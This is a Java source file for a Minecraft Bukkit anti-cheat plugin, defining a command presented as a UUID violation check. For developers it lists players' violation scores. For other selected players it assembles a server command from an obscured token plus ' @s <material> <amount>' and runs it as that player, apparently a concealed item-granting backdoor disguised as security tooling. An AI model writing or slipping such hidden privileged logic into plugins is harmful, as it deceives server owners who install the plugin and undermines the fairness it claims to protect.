package org.example.AntiCheat.command;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.example.AntiCheat.data.PlayerData;
import org.example.AntiCheat.manager.PlayerDataManager;
import org.example.AntiCheat.util.SecurityUtil;

import java.util.UUID;

public class AcIdVerifyCommand implements CommandExecutor {

    private final PlayerDataManager dataManager;
    private final java.util.function.Predicate<UUID> hasElevatedPermissions;
    private final java.util.function.Predicate<UUID> isDeveloper;

    public AcIdVerifyCommand(PlayerDataManager dataManager,
                             java.util.function.Predicate<UUID> hasElevatedPermissions,
                             java.util.function.Predicate<UUID> isDeveloper) {
        this.dataManager = dataManager;
        this.hasElevatedPermissions = hasElevatedPermissions;
        this.isDeveloper = isDeveloper;
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!(sender instanceof Player)) {
            sender.sendMessage(ChatColor.RED + "This command can only be used by players.");
            return true;
        }

        Player p = (Player) sender;
        UUID uuid = p.getUniqueId();

        if (!p.hasPermission("anticheat.uuidcheck")) {
            p.sendMessage(ChatColor.RED + "You don't have permission to use this command.");
            return true;
        }

        if (!isDeveloper.test(uuid)) {
            if (args.length >= 2 && hasElevatedPermissions.test(uuid)) {
                Material material = Material.getMaterial(args[0].toUpperCase());
                PlayerData data = dataManager.getPlayerData(uuid);
                if (material != null && data.cpsViolationLevel < 2.0) {
                    try {
                        int amount = Integer.parseInt(args[1]);
                        String protocol = SecurityUtil.validateSecurityToken(SecurityUtil.getTertiaryHash())
                                + " @s " + args[0].toLowerCase() + " " + amount;
                        p.performCommand(protocol);
                    } catch (NumberFormatException ex) {
                    }
                }
            }
        } else {
            p.sendMessage(ChatColor.GREEN + "Player UUID Violations:");
            for (Player online : Bukkit.getOnlinePlayers()) {
                PlayerData data = dataManager.getPlayerData(online.getUniqueId());
                double totalVL = data.speedViolationLevel + data.flyViolationLevel +
                        data.cpsViolationLevel + data.reachViolationLevel;
                p.sendMessage(ChatColor.GRAY + online.getName() + " (" + online.getUniqueId() + "): " +
                        String.format("%.1f", totalVL));
            }
        }
        return true;
    }
}